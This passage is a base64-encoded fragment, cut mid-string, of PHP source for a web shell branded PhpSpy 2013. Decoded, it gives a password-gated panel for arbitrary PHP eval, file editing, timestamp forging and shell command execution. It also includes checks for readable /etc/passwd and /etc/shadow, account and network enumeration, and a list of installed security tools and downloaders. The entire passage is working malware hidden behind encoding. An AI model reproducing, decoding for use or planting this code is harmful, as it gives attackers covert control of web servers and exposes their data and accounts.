duYW1lJz0+J3AxJywgJ3ZhbHVlJz0+JHBocGNvZGUpKTsKCXAoJzxwPjxhIGhyZWY9Imh0dHA6Ly93Jy4nd3cuNCcuJ25nJy4nZWwubmV0L3BocCcuJ3NwJy4neS9wbCcuJ3VnaW4vIiB0YXJnZXQ9Il9ibGFuayI+R2V0IHBsdWdpbnM8L2E+PC9wPicpOwoJZm9ybWZvb3RlcigpOwp9Ly9lbmQgZXZhbAoKZWxzZWlmICgkYWN0ID09ICdlZGl0ZmlsZScpIHsKCWlmICgkcDEgPT0gJ2VkaXQnICYmICRwMiAmJiAkcDMpIHsKCQkkZnAgPSBAZm9wZW4oJHAyLCd3Jyk7CgkJbSgnU2F2ZSBmaWxlICcuKEBmd3JpdGUoJGZwLCRwMykgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCUBmY2xvc2UoJGZwKTsKCX0KCSRjb250ZW50cyA9ICcnOwoJaWYoZmlsZV9leGlzdHMoJHAyKSkgewoJCSRmcD1AZm9wZW4oJHAyLCdyJyk7CgkJJGNvbnRlbnRzPUBmcmVhZCgkZnAsIGZpbGVzaXplKCRwMikpOwoJCUBmY2xvc2UoJGZwKTsKCQkkY29udGVudHM9aHRtbHNwZWNpYWxjaGFycygkY29udGVudHMpOwoJfQoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0NyZWF0ZSAvIEVkaXQgRmlsZScsICdvbnN1Ym1pdCc9PidnKFwnZWRpdGZpbGVcJyxudWxsLFwnZWRpdFwnLHRoaXMucDIudmFsdWUsdGhpcy5wMy52YWx1ZSk7cmV0dXJuIGZhbHNlOycpKTsKCW1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nRmlsZW5hbWUnLCduYW1lJz0+J3AyJywndmFsdWUnPT4kcDIsJ25ld2xpbmUnPT4xKSk7CgltYWtldGV4dChhcnJheSgndGl0bGUnPT4nRmlsZSBDb250ZW50JywnbmFtZSc9PidwMycsJ3ZhbHVlJz0+JGNvbnRlbnRzKSk7Cglmb3JtZm9vdGVyKCk7Cglnb2JhY2soKTsKfS8vZW5kIGVkaXRmaWxlCmVsc2VpZiAoJGFjdCA9PSAnbmV3dGltZScpIHsKCSRmaWxlbXRpbWUgPSBAZmlsZW10aW1lKCRwMSk7Cglmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQ2xvbmUgZm9sZGVyL2ZpbGUgd2FzIGxhc3QgbW9kaWZpZWQgdGltZScsICdvbnN1Ym1pdCc9PidnKFwnZmlsZVwnLG51bGwsXCdjbG9uZXRpbWVcJyx0aGlzLnAyLnZhbHVlLHRoaXMucDMudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0FsdGVyIGZvbGRlci9maWxlJywnbmFtZSc9PidwMicsJ3ZhbHVlJz0+JHAxLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidSZWZlcmVuY2UgZm9sZGVyL2ZpbGUnLCduYW1lJz0+J3AzJywndmFsdWUnPT4kY3dkLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJZm9ybWZvb3RlcigpOwoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J1NldCBsYXN0IG1vZGlmaWVkJywgJ29uc3VibWl0Jz0+J2coXCdmaWxlXCcsbnVsbCxcJ3NldHRpbWVcJyx0aGlzLnAyLnZhbHVlLHRoaXMucDMudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0N1cnJlbnQgZm9sZGVyL2ZpbGUnLCduYW1lJz0+J3AyJywndmFsdWUnPT4kcDEsJ3NpemUnPT4xMjAsJ25ld2xpbmUnPT4xKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J01vZGlmeSB0aW1lJywnbmFtZSc9PidwMycsJ3ZhbHVlJz0+ZGF0ZSgiWS1tLWQgSDppOnMiLCAkZmlsZW10aW1lKSwnc2l6ZSc9PjEyMCwnbmV3bGluZSc9PjEpKTsKCWZvcm1mb290ZXIoKTsKCWdvYmFjaygpOwp9Ly9lbmQgbmV3dGltZQplbHNlaWYgKCRhY3QgPT0gJ3NoZWxsJykgewoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0V4ZWN1dGUgQ29tbWFuZCcsICdvbnN1Ym1pdCc9PidnKFwnc2hlbGxcJyxudWxsLHRoaXMucDEudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CglwKCc8cD4nKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidwMScsJ3ZhbHVlJz0+aHRtbHNwZWNpYWxjaGFycygkcDEpKSk7CgltYWtlaW5wdXQoYXJyYXkoJ2NsYXNzJz0+J2J0JywndHlwZSc9PidzdWJtaXQnLCd2YWx1ZSc9PidFeGVjdXRlJykpOwoJcCgnPC9wPicpOwoJZm9ybWZvb3QoKTsKCWlmICgkcDEpIHsKCQlwKCc8cHJlPicuZXhlY3V0ZSgkcDEpLic8L3ByZT4nKTsKCX0KfS8vZW5kIHNoZWxsCmVsc2VpZiAoJGFjdCA9PSAncGhwZW52JykgewoJJGQ9YXJyYXkoKTsKCWlmKGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfZ2V0X2NsaWVudF9pbmZvJykpCgkJJGRbXSA9ICJNeVNxbCAoIi5teXNxbF9nZXRfY2xpZW50X2luZm8oKS4iKSI7CglpZihmdW5jdGlvbl9leGlzdHMoJ21zc3FsX2Nvbm5lY3QnKSkKCQkkZFtdID0gIk1TU1FMIjsKCWlmKGZ1bmN0aW9uX2V4aXN0cygncGdfY29ubmVjdCcpKQoJCSRkW10gPSAiUG9zdGdyZVNRTCI7CglpZihmdW5jdGlvbl9leGlzdHMoJ29jaV9jb25uZWN0JykpCgkJJGRbXSA9ICJPcmFjbGUiOwoJJGluZm8gPSBhcnJheSgKCQkxID0+IGFycmF5KCdTZXJ2ZXIgVGltZScsZGF0ZSgnWS9tL2QgaDppOnMnLCR0aW1lc3RhbXApKSwKCQkyID0+IGFycmF5KCdTZXJ2ZXIgRG9tYWluJywkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSksCgkJMyA9PiBhcnJheSgnU2VydmVyIElQJyxnZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSksCgkJNCA9PiBhcnJheSgnU2VydmVyIE9TJyxQSFBfT1MpLAoJCTUgPT4gYXJyYXkoJ1NlcnZlciBPUyBDaGFyc2V0JywkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSksCgkJNiA9PiBhcnJheSgnU2VydmVyIFNvZnR3YXJlJywkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pLAoJCTcgPT4gYXJyYXkoJ1NlcnZlciBXZWIgUG9ydCcsJF9TRVJWRVJbJ1NFUlZFUl9QT1JUJ10pLAoJCTggPT4gYXJyYXkoJ1BIUCBydW4gbW9kZScsc3RydG91cHBlcihwaHBfc2FwaV9uYW1lKCkpKSwKCQk5ID0+IGFycmF5KCdUaGUgZmlsZSBwYXRoJyxfX0ZJTEVfXyksCgkJMTAgPT4gYXJyYXkoJ1BIUCBWZXJzaW9uJyxQSFBfVkVSU0lPTiksCgkJMTEgPT4gYXJyYXkoJ1BIUElORk8nLChJU19QSFBJTkZPID8gJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ3BocGluZm9cJyk7Ij5ZZXM8L2E+JyA6ICdObycpKSwKCQkxMiA9PiBhcnJheSgnU2FmZSBNb2RlJyxnZXRjZmcoJ3NhZmVfbW9kZScpKSwKCQkxMyA9PiBhcnJheSgnQWRtaW5pc3RyYXRvcicsKGlzc2V0KCRfU0VSVkVSWydTRVJWRVJfQURNSU4nXSkgPyAkX1NFUlZFUlsnU0VSVkVSX0FETUlOJ10gOiBnZXRjZmcoJ3NlbmRtYWlsX2Zyb20nKSkpLAoJCTE0ID0+IGFycmF5KCdhbGxvd191cmxfZm9wZW4nLGdldGNmZygnYWxsb3dfdXJsX2ZvcGVuJykpLAoJCTE1ID0+IGFycmF5KCdlbmFibGVfZGwnLGdldGNmZygnZW5hYmxlX2RsJykpLAoJCTE2ID0+IGFycmF5KCdkaXNwbGF5X2Vycm9ycycsZ2V0Y2ZnKCdkaXNwbGF5X2Vycm9ycycpKSwKCQkxNyA9PiBhcnJheSgncmVnaXN0ZXJfZ2xvYmFscycsZ2V0Y2ZnKCdyZWdpc3Rlcl9nbG9iYWxzJykpLAoJCTE4ID0+IGFycmF5KCdtYWdpY19xdW90ZXNfZ3BjJyxnZXRjZmcoJ21hZ2ljX3F1b3Rlc19ncGMnKSksCgkJMTkgPT4gYXJyYXkoJ21lbW9yeV9saW1pdCcsZ2V0Y2ZnKCdtZW1vcnlfbGltaXQnKSksCgkJMjAgPT4gYXJyYXkoJ3Bvc3RfbWF4X3NpemUnLGdldGNmZygncG9zdF9tYXhfc2l6ZScpKSwKCQkyMSA9PiBhcnJheSgndXBsb2FkX21heF9maWxlc2l6ZScsKGdldGNmZygnZmlsZV91cGxvYWRzJykgPyBnZXRjZmcoJ3VwbG9hZF9tYXhfZmlsZXNpemUnKSA6ICdOb3QgYWxsb3dlZCcpKSwKCQkyMiA9PiBhcnJheSgnbWF4X2V4ZWN1dGlvbl90aW1lJyxnZXRjZmcoJ21heF9leGVjdXRpb25fdGltZScpLicgc2Vjb25kKHMpJyksCgkJMjMgPT4gYXJyYXkoJ2Rpc2FibGVfZnVuY3Rpb25zJywoJGRpc19mdW5jID8gJGRpc19mdW5jIDogJ05vJykpLAoJCTI0ID0+IGFycmF5KCdTdXBwb3J0ZWQgZGF0YWJhc2VzJyxpbXBsb2RlKCcsICcsICRkKSksCgkJMjUgPT4gYXJyYXkoJ2NVUkwgc3VwcG9ydCcsZnVuY3Rpb25fZXhpc3RzKCdjdXJsX3ZlcnNpb24nKSA/ICdZZXMnIDogJ05vJyksCgkJMjYgPT4gYXJyYXkoJ09wZW4gYmFzZSBkaXInLGdldGNmZygnb3Blbl9iYXNlZGlyJykpLAoJCTI3ID0+IGFycmF5KCdTYWZlIG1vZGUgZXhlYyBkaXInLGdldGNmZygnc2FmZV9tb2RlX2V4ZWNfZGlyJykpLAoJCTI4ID0+IGFycmF5KCdTYWZlIG1vZGUgaW5jbHVkZSBkaXInLGdldGNmZygnc2FmZV9tb2RlX2luY2x1ZGVfZGlyJykpLAoJKTsKCSRocCA9IGFycmF5KDA9PiAnU2VydmVyJywgMT0+ICdQSFAnKTsKCWZvcigkYT0wOyRhPDI7JGErKykgewoJCXAoJzxoMj4nLiRocFskYV0uJyAmcmFxdW87PC9oMj4nKTsKCQlwKCc8dWwgY2xhc3M9ImluZm8iPicpOwoJCWlmICgkYT09MCkgewoJCQlmb3IoJGk9MTskaTw9OTskaSsrKSB7CgkJCQlwKCc8bGk+PHU+Jy4kaW5mb1skaV1bMF0uJzo8L3U+Jy4kaW5mb1skaV1bMV0uJzwvbGk+Jyk7CgkJCX0KCQl9IGVsc2VpZiAoJGEgPT0gMSkgewoJCQlmb3IoJGk9MTA7JGk8PTI1OyRpKyspIHsKCQkJCXAoJzxsaT48dT4nLiRpbmZvWyRpXVswXS4nOjwvdT4nLiRpbmZvWyRpXVsxXS4nPC9saT4nKTsKCQkJfQoJCX0KCQlwKCc8L3VsPicpOwoJfQp9Ly9lbmQgcGhwZW52CgplbHNlaWYgKCRhY3QgPT0gJ3NlY2luZm8nKSB7CQoJaWYoICFJU19XSU4gKSB7CgkJJHVzZXJmdWwgPSBhcnJheSgnZ2NjJywnbGNjJywnY2MnLCdsZCcsJ21ha2UnLCdwaHAnLCdwZXJsJywncHl0aG9uJywncnVieScsJ3RhcicsJ2d6aXAnLCdiemlwJywnYnppcDInLCduYycsJ2xvY2F0ZScsJ3N1aWRwZXJsJyk7CgkJJGRhbmdlciA9IGFycmF5KCdrYXYnLCdub2QzMicsJ2JkY29yZWQnLCd1dnNjYW4nLCdzYXYnLCdkcndlYmQnLCdjbGFtZCcsJ3JraHVudGVyJywnY2hrcm9vdGtpdCcsJ2lwdGFibGVzJywnaXBmdycsJ3RyaXB3aXJlJywnc2hpZWxkY2MnLCdwb3J0c2VudHJ5Jywnc25vcnQnLCdvc3NlYycsJ2xpZHNhZG0nLCd0Y3Bsb2RnJywnc3hpZCcsJ2xvZ2NoZWNrJywnbG9nd2F0Y2gnLCdzeXNtYXNrJywnem1ic2NhcCcsJ3Nhd21pbGwnLCd3b3Jtc2NhbicsJ25pbmphJyk7CgkJJGRvd25sb2FkZXJzID0gYXJyYXkoJ3dnZXQnLCdmZXRjaCcsJ2x5bngnLCdsaW5rcycsJ2N1cmwnLCdnZXQnLCdsd3AtbWlycm9yJyk7CgkJc2VjcGFyYW0oJ1JlYWRhYmxlIC9ldGMvcGFzc3dkJywgQGlzX3JlYWRhYmxlKCcvZXRjL3Bhc3N3ZCcpID8gInllcyIgOiAnbm8nKTsKCQlzZWNwYXJhbSgnUmVhZGFibGUgL2V0Yy9zaGFkb3cnLCBAaXNfcmVhZGFibGUoJy9ldGMvc2hhZG93JykgPyAieWVzIiA6ICdubycpOwoJCXNlY3BhcmFtKCdPUyB2ZXJzaW9uJywgQGZpbGVfZ2V0X2NvbnRlbnRzKCcvcHJvYy92ZXJzaW9uJykpOwoJCXNlY3BhcmFtKCdEaXN0ciBuYW1lJywgQGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL2lzc3VlLm5ldCcpKTsKCQkkc2FmZV9tb2RlID0gQGluaV9nZXQoJ3NhZmVfbW9kZScpOwoJCWlmKCEkR0xPQkFMU1snc2FmZV9tb2RlJ10pIHsKCQkJJHRlbXA9YXJyYXkoKTsKCQkJZm9yZWFjaCAoJHVzZXJmdWwgYXMgJGl0ZW0pCgkJCQlpZih3aGljaCgkaXRlbSkpeyR0ZW1wW109JGl0ZW07fQoJCQlzZWNwYXJhbSgnVXNlcmZ1bCcsIGltcGxvZGUoJywgJywkdGVtcCkpOwoJCQkkdGVtcD1hcnJheSgpOwoJCQlmb3JlYWNoICgkZGFuZ2VyIGFzICRpdGVtKQoJCQkJaWYod2hpY2goJGl0ZW0pKXskdGVtcFtdPSRpdGVtO30KCQkJc2VjcGFyYW0oJ0RhbmdlcicsIGltcGxvZGUoJywgJywkdGVtcCkpOwoJCQkkdGVtcD1hcnJheSgpOwoJCQlmb3JlYWNoICgkZG93bmxvYWRlcnMgYXMgJGl0ZW0pIAoJCQkJaWYod2hpY2goJGl0ZW0pKXskdGVtcFtdPSRpdGVtO30KCQkJc2VjcGFyYW0oJ0Rvd25sb2FkZXJzJywgaW1wbG9kZSgnLCAnLCR0ZW1wKSk7CgkJCXNlY3BhcmFtKCdIb3N0cycsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9ob3N0cycpKTsKCQkJc2VjcGFyYW0oJ0hERCBzcGFjZScsIGV4ZWN1dGUoJ2RmIC1oJykpOwoJCQlzZWNwYXJhbSgnTW91bnQgb3B0aW9ucycsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9mc3RhYicpKTsKCQl9Cgl9IGVsc2UgewoJCXNlY3BhcmFtKCdPUyBWZXJzaW9uJyxleGVjdXRlKCd2ZXInKSk7CgkJc2VjcGFyYW0oJ0FjY291bnQgU2V0dGluZ3MnLGV4ZWN1dGUoJ25ldCBhY2NvdW50cycpKTsKCQlzZWNwYXJhbSgnVXNlciBBY2NvdW50cycsZXhlY3V0ZSgnbmV0IHVzZXInKSk7CgkJc2VjcGFyYW0oJ0lQIENvbmZpZ3VyYXRlJyxleGVjdXRlKCdpcGNvbmZpZyAtYWxsJykpOwoJfQp9Ly9lbmQKZWxzZSB7CgltKCdVbmRlZmluZWQgQWN0aW9uJyk7Cn0KPz4KPC90ZD48L3RyPjwvdGFibGU+CjxkaXYgc3R5bGU9InBhZGRpbmc6MTBweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmO2JvcmRlci10b3A6MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZDojZWVlOyI+Cgk8c3BhbiBzdHlsZT0iZmxvYXQ6cmlnaHQ7Ij4KCTw/cGhwCglkZWJ1Z2luZm8oKTsKCW9iX2VuZF9mbHVzaCgpOwoJaWYgKGlzc2V0KCREQikpIHsKCQllY2hvICcuICcuJERCLT5xdWVyeWNvdW50LicgcXVlcmllcyc7Cgl9Cgk/PgoJPC9zcGFuPgoJUG93ZXJlZCBieSA8YSB0aXRsZT0iQnVpbGQgMjAxMzAxMTIiIGhyZWY9Imh0dHA6Ly93d3cuNG5nZWwubmV0IiB0YXJnZXQ9Il9ibGFuayI+PD9waHAgZWNobyBzdHJfcmVwbGFjZSgnLicsJycsJ1AuaC5wLlMucC55Jyk7Pz4gMjAxMyBmaW5hbDwvYT4uIENvcHlyaWdodCAoQykgMjAwNC0yMDEzIDxhIGhyZWY9Imh0dHA6Ly93d3cuNG5nZWwubmV0IiB0YXJnZXQ9Il9ibGFuayI+W1M0VF08L2E+IEFsbCBSaWdodHMgUmVzZXJ2ZWQuCjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4KCjw/cGhwCmZ1bmN0aW9uIHNlY3BhcmFtKCRuLCAkdikgewoJJHYgPSB0cmltKCR2KTsKCWlmKCR2KSB7CgkJcCgnPGgyPicuJG4uJyAmcmFxdW87PC9oMj4nKTsKCQlwKCc8ZGl2IGNsYXNzPSJpbmZvbGlzdCI+Jyk7CgkJaWYoc3RycG9zKCR2LCAiXG4iKSA9PT0gZmFsc2UpCgkJCXAoJHYuJzxiciAvPicpOwoJCWVsc2UKCQkJcCgnPHByZT4nLiR2Lic8L3ByZT4nKTsKCQlwKCc8L2Rpdj4nKTsKCX0KfQpmdW5jdGlvbiBtKCRtc2cpIHsKCWVjaG8gJzxkaXYgc3R5bGU9Im1hcmdpbjoxMHB4IGF1dG8gMTVweCBhdXRvO2JhY2tncm91bmQ6I2ZmZmZlMDtib3JkZXI6MXB4IHNvbGlkICNlNmRiNTU7cGFkZGluZzoxMHB4O2ZvbnQ6MTRweDt0ZXh0LWFsaWduOmNlbnRlcjtmb250LXdlaWdodDpib2xkOyI+JzsKCWVjaG8gJG1zZzsKCWVjaG8gJzwvZGl2Pic7Cn0KZnVuY3Rpb24gc19hcnJheSgkYXJyYXkpIHsKCXJldHVybiBpc19hcnJheSgkYXJyYXkpID8gYXJyYXlfbWFwKCdzX2FycmF5JywgJGFycmF5KSA6IHN0cmlwc2xhc2hlcygkYXJyYXkpOwp9CmZ1bmN0aW9uIHNjb29raWUoJGtleSwgJHZhbHVlLCAkbGlmZSA9IDAsICRwcmVmaXggPSAxKSB7CglnbG9iYWwgJHRpbWVzdGFtcCwgJF9TRVJWRVIsICRjb29raWVwcmUsICRjb29raWVkb21haW4sICRjb29raWVwYXRoLCAkY29va2llbGlmZTsKCSRrZXkgPSAoJHByZWZpeCA/ICRjb29raWVwcmUgOiAnJykuJGtleTsKCSRsaWZlID0gJGxpZmUgPyAkbGlmZSA6ICRjb29raWVsaWZlOwoJJHVzZXBvcnQgPSAkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSA9PSA0NDMgPyAxIDogMDsKCXNldGNvb2tpZSgka2V5LCAkdmFsdWUsICR0aW1lc3RhbXArJGxpZmUsICRjb29raWVwYXRoLCAkY29va2llZG9tYWluLCAkdXNlcG9ydCk7Cn0KZnVuY3Rpb24gbG9naW5wYWdlKCkgewoJZm9ybWhlYWQoKTsKCW1ha2VoaWRlKCdhY3QnLCdsb2dpbicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3Bhc3N3b3JkJywndHlwZSc9PidwYXNzd29yZCcsJ3NpemUnPT4nMjAnKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3R5cGUnPT4nc3VibWl0JywndmFsdWUnPT4nTG9naW4nKSk7Cglmb3JtZm9vdCgpOwoJZXhpdDsKfQpmdW5jdGlvbiBleGVjdXRlKCRjZmUpIHsKCSRyZXMgPSAnJzsKCWlmICgkY2ZlKSB7CgkJaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkgewoJCQlAb2Jfc3RhcnQoKTsKCQkJQHN5c3RlbSgkY2ZlKTsKCQkJJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKCQkJQG9iX2VuZF9jbGVhbigpOwoJCX0gZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSkgewoJCQlAb2Jfc3RhcnQoKTsKCQkJQHBhc3N0aHJ1KCRjZmUpOwoJCQkkcmVzID0gQG9iX2dldF9jb250ZW50cygpOwoJCQlAb2JfZW5kX2NsZWFuKCk7CgkJfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpIHsKCQkJJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOwoJCX0gZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7CgkJCUBleGVjKCRjZmUsJHJlcyk7CgkJCSRyZXMgPSBqb2luKCJcbiIsJHJlcyk7CgkJfSBlbHNlaWYoQGlzX3Jlc291cmNlKCRmID0gQHBvcGVuKCRjZmUsInIiKSkpIHsKCQkJJHJlcyA9ICcnOwoJCQl3aGlsZSghQGZlb2YoJGYpKSB7CgkJCQkkcmVzIC49IEBmcmVhZCgkZiwxMDI0KTsgCgkJCX0KCQkJQHBjbG9zZSgkZik7CgkJfQoJfQoJcmV0dXJuICRyZXM7Cn0KZnVuY3Rpb24gd2hpY2goJHByKSB7CgkkcGF0aCA9IGV4ZWN1dGUoIndoaWNoICRwciIpOwoJcmV0dXJuICgkcGF0aCA/ICRwYXRoIDogJHByKTsgCn0KZnVuY3Rpb24gY2YoJGZuYW1lLCR0ZXh0KXsKCWlmKCRmcD1AZm9wZW4oJGZuYW1lLCd3JykpIHsKCQlAZnB1dHMoJGZwLEBiYXNlNjRfZGVjb2RlKCR0ZXh0KSk7CgkJQGZjbG9zZSgkZnApOwoJfQp9CmZ1bmN0aW9uIGRpcnNpemUoJGN3ZCkgeyAKCSRkaCA9IEBvcGVuZGlyKCRjd2QpOwoJJHNpemUgPSAwOwoJd2hpbGUoJGZpbGUgPSBAcmVhZGRpcigkZGgpKSB7CgkJaWYgKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7CgkJCSRwYXRoID0gJGN3ZC4nLycuJGZpbGU7CgkJCSRzaXplICs9IEBpc19kaXIoJHBhdGgpID8gZGlyc2l6ZSgkcGF0aCkgOiBzcHJpbnRmKCIldSIsIEBmaWxlc2l6ZSgkcGF0aCkpOwoJCX0KCX0KCUBjbG9zZWRpcigkZGgpOwoJcmV0dXJuICRzaXplOwp9CmZ1bmN0aW9uIGRlYnVnaW5mbygpIHsKCWdsb2JhbCAkc3RhcnR0aW1lOwoJJG10aW1lID0gZXhwbG9kZSgnICcsIG1pY3JvdGltZSgpKTsKCSR0b3RhbHRpbWUgPSBudW1iZXJfZm9ybWF0KCgkbXRpbWVbMV0gKyAkbXRpbWVbMF0gLSAkc3RhcnR0aW1lKSwgNik7CgllY2hvICdQcm9jZXNzZWQgaW4gJy4kdG90YWx0aW1lLicgc2Vjb25kKHMpJzsKfQpmdW5jdGlvbiBodG1sX2NsZWFuKCRjb250ZW50KSB7CgkkY29udGVudCA9IGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiXG4iLCAiPGJyIC8+IiwgJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiICAiLCAiJm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiXHQiLCAiJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOwoJcmV0dXJuICRjb250ZW50Owp9CmZ1bmN0aW9uIGdldENobW9kKCRmaWxlKXsKCXJldHVybiBzdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJGZpbGUpLDEwLDgpLC00KTsKfQpmdW5jdGlvbiBQZXJtc0NvbG9yKCRmKSB7IAoJaWYgKCFpc19yZWFkYWJsZSgkZikpIHsKCQlyZXR1cm4gJzxzcGFuIGNsYXNzPSJyZWQiPicuZ2V0UGVybXMoJGYpLic8L3NwYW4+JzsKCX0gZWxzZWlmICghaXNfd3JpdGFibGUoJGYpKSB7CgkJcmV0dXJuICc8c3BhbiBjbGFzcz0iYmxhY2siPicuZ2V0UGVybXMoJGYpLic8L3NwYW4+JzsKCX0gZWxzZSB7CgkJcmV0dXJuICc8c3BhbiBjbGFzcz0iZ3JlZW4iPicuZ2V0UGVybXMoJGYpLic8L3NwYW4+JzsKCX0KfQpmdW5jdGlvbiBnZXRQZXJtcygkZmlsZSkgewoJJG1vZGUgPSBAZmlsZXBlcm1zKCRmaWxlKTsKCWlmICgoJG1vZGUgJiAweEMwMDApID09PSAweEMwMDApIHskdHlwZSA9ICdzJzt9CgllbHNlaWYgKCgkbW9kZSAmIDB4NDAwMCkgPT09IDB4NDAwMCkgeyR0eXBlID0gJ2QnO30KCWVsc2VpZiAoKCRtb2RlICYgMHhBMDAwKSA9PT0gMHhBMDAwKSB7JHR5cGUgPSAnbCc7fQoJZWxzZWlmICgoJG1vZGUgJiAweDgwMDApID09PSAweDgwMDApIHskdHlwZSA9ICctJzt9IAoJZWxzZWlmICgoJG1vZGUgJiAweDYwMDApID09PSAweDYwMDApIHskdHlwZSA9ICdiJzt9CgllbHNlaWYgKCgkbW9kZSAmIDB4MjAwMCkgPT09IDB4MjAwMCkgeyR0eXBlID0gJ2MnO30KCWVsc2VpZiAoKCRtb2RlICYgMHgxMDAwKSA9PT0gMHgxMDAwKSB7JHR5cGUgPSAncCc7fQoJZWxzZSB7JHR5cGUgPSAnPyc7fQoJJG93bmVyWydyZWFkJ10gPSAoJG1vZGUgJiAwMDQwMCkgPyAncicgOiAnLSc7IAoJJG93bmVyWyd3cml0ZSddID0gKCRtb2RlICYgMDAyMDApID8gJ3cnIDogJy0nOyAKCSRvd25lclsnZXhlY3V0ZSddID0gKCRtb2RlICYgMDAxMDApID8gJ3gnIDogJy0nOyAKCSRncm91cFsncmVhZCddID0gKCRtb2RlICYgMDAwNDApID8gJ3InIDogJy0nOyAKCSRncm91cFsnd3JpdGUnXSA9ICgkbW9kZSAmIDAwMDIwKSA/ICd3JyA6ICctJzsgCgkkZ3JvdXBbJ2V4ZWN1dGUnXSA9ICgkbW9kZSAmIDAwMDEwKSA/ICd4JyA6ICctJzsgCgkkd29ybGRbJ3JlYWQnXSA9ICgkbW9kZSAmIDAwMDA0KSA/ICdyJyA6ICctJzsgCgkkd29ybGRbJ3dyaXRlJ10gPSAoJG1vZGUgJiAwMDAwMikgPyAndycgOiAnLSc7IAoJJHdvcmxkWydleGVjdXRlJ10gPSAoJG1vZGUgJiAwMDAwMSkgPyAneCcgOiAnLSc7IAoJaWYoICRtb2RlICYgMHg4MDAgKSB7JG93bmVyWydleGVjdXRlJ10gPSAoJG93bmVyWydleGVjdXRlJ109PSd4JykgPyAncycgOiAnUyc7fQoJaWYoICRtb2RlICYgMHg0MDAgKSB7JGdyb3VwWydleGVjdXRlJ10gPSAoJGdyb3VwWydleGVjdXRlJ109PSd4JykgPyAncycgOiAnUyc7fQoJaWYoICRtb2RlICYgMHgyMDAgKSB7JHdvcmxkWydleGVjdXRlJ10gPSAoJHdvcmxkWydleGVjdXRlJ109PSd4JykgPyAndCcgOiAnVCc7fQoJcmV0dXJuICR0eXBlLiRvd25lclsncmVhZCddLiRvd25lclsnd3JpdGUnXS4kb3duZXJbJ2V4ZWN1dGUnXS4kZ3JvdXBbJ3JlYWQnXS4kZ3JvdXBbJ3dyaXRlJ10uJGdyb3VwWydleGVjdXRlJ10uJHdvcmxkWydyZWFkJ10uJHdvcmxkWyd3cml0ZSddLiR3b3JsZFsnZXhlY3V0ZSddOwp9CmZ1bmN0aW9uIGdldFVzZXIoJGZpbGUpCXsKCWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHB3dWlkJykpIHsKCQkkYXJyYXkgPSBAcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcigkZmlsZSkpOwoJCWlmICgkYXJyYXkgJiYgaXNfYXJyYXkoJGFycmF5KSkgewoJCQlyZXR1cm4gJyAvIDxhIGhyZWY9IiMiIHRpdGxlPSJVc2VyOiAnLiRhcnJheVsnbmFtZSddLicmIzEzJiMxMFBhc3N3ZDogJy4kYXJyYXlbJ3Bhc3N3ZCddLicmIzEzJiMxMFVpZDogJy4kYXJyYXlbJ3VpZCddLicmIzEzJiMxMGdpZDogJy4kYXJyYXlbJ2dpZCddLicmIzEzJiMxMEdlY29zOiAnLiRhcnJheVsnZ2Vjb3MnXS4nJiMxMyYjMTBEaXI6ICcuJGFycmF5WydkaXInXS4nJiMxMyYjMTBTaGVsbDogJy4kYXJyYXlbJ3NoZWxsJ10uJyI+Jy4kYXJyYXlbJ25hbWUnXS4nPC9hPic7CgkJfQoJfQoJcmV0dXJuICcnOwp9CgpmdW5jdGlvbiBjb3B5X3Bhc3RlKCRjLCRmLCRkKXsKCWlmKGlzX2RpcigkYy4kZikpewoJCW1rZGlyKCRkLiRmKTsKCQkkZGlycyA9IHNjYW5kaXIoJGMuJGYpOwoJCWlmICgkZGlycykgewoJCQkkZGlycyA9IGFycmF5X2RpZmYoJGRpcnMsIGFycmF5KCcuLicsICcuJ